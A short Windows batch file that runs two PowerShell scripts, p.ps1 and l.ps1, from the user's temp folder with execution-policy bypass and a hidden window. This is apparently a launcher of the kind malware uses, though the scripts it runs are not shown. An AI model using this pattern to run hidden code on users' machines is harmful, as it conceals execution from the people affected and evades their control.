@echo off
REM Check if p.ps1 exists
IF EXIST "%TEMP%\p.ps1" (
    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\p.ps1"
) ELSE (
    echo "p.ps1 not found in %TEMP%"
)

REM Check if l.ps1 exists
IF EXIST "%TEMP%\l.ps1" (
    PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\l.ps1"
) ELSE (
    echo "l.ps1 not found in %TEMP%"
)
